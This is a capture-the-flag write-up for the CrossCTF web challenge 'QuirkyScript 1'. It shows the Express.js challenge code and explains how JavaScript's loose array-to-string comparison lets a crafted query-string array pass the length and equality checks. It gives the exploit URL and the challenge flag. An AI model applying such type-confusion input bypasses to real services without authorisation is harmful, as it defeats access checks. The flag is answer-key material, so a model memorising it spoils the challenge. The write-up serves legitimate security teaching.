# QuirkyScript 1
Web

## Challenge 
> Get the flag.

> http://ctf.pwn.sg:8081

> Creator - quanyang (@quanyang)

> [challenge.js](challenge.js)

## Solution

#### Javascript Joke
![x](https://i.redditmedia.com/1UhkJVkzV9q8VEmWxyRPL8yaR9vo8vusV5xn_n-YZN8.png?s=bb40fdc322b94372465c4fbea06cecbc)

#### Express JS

Javascript code

	var flag=require("./flag.js");
	var express=require('express')
	var app=express()
	app.get('/flag',function(req,res){
		if(req.query.first){
			if(req.query.first.length==8&&req.query.first==",,,,,,,"){
				res.send(flag.flag);
				return;
			}
		}
		res.send("Try to solve this.");
	});
	app.listen(31337)

Understand how Express JS works

https://expressjs.com/en/api.html#req.query


Now, we know we need to have a url in this format

	http://ctf.pwn.sg:8081/flag?first=payload

---

#### Javascript Quirks

It is playing with commas in array to string conversion

	>> '1,2,3' == [1, 2, 3]
	 true

	>> [,,,,,,,,] == ',,,,,,,'
	 true

	>> [,,,,,,,,].length
	 8

#### Final URL

	http://ctf.pwn.sg:8081/flag?first[1]&first[2]&first[3]&first[4]&first[5]&first[6]&first[7]&first[8]

## Flag

	CrossCTF{C0mm4s_4ll_th3_w4y_t0_th3_fl4g}.
